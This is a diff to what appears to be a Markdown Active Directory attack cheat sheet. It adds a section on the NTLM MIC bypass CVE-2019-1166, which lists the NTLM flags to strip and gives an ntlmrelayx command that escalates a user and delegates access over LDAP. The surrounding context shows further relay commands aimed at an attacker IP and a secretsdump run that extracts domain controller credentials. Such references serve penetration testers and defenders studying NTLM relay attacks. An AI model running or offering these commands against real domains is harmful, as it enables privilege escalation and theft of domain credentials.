@@ -124,7 +124,7 @@ impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
 ```
 
 
-## Drop the MIC
+## Drop the MIC - CVE-2019-1040
 
 > The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP
 
@@ -155,6 +155,20 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
     export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
     secretsdump.py -k -no-pass second-dc-server.local -just-dc
     ```
+
+
+## Drop the MIC 2 - CVE-2019-1166
+
+> A tampering vulnerability exists in Microsoft Windows when a man-in-the-middle attacker is able to successfully bypass the NTLM MIC (Message Integrity Check) protection. An attacker who successfully exploited this vulnerability could gain the ability to downgrade NTLM security features. To exploit this vulnerability, the attacker would need to tamper with the NTLM exchange. The attacker could then modify flags of the NTLM packet without invalidating the signature.
+
+* Unset the signing flags in the `NTLM_NEGOTIATE` message (`NTLMSSP_NEGOTIATE_ALWAYS_SIGN`, `NTLMSSP_NEGOTIATE_SIGN`)
+* Inject a rogue msvAvFlag field in the `NTLM_CHALLENGE` message with a value of zeros
+* Remove the MIC from the `NTLM_AUTHENTICATE` message
+* Unset the following flags in the `NTLM_AUTHENTICATE` message: `NTLMSSP_NEGOTIATE_ALWAYS_SIGN`, `NTLMSSP_NEGOTIATE_SIGN`, `NEGOTIATE_KEY_EXCHANGE`, `NEGOTIATE_VERSION`.
+
+```ps1
+ntlmrelayx.py -t ldap://dc.domain.com --escalate-user 'youruser$' -smb2support --remove-mic --delegate-access
+```
 
 
 ## Ghost Potato - CVE-2019-1384
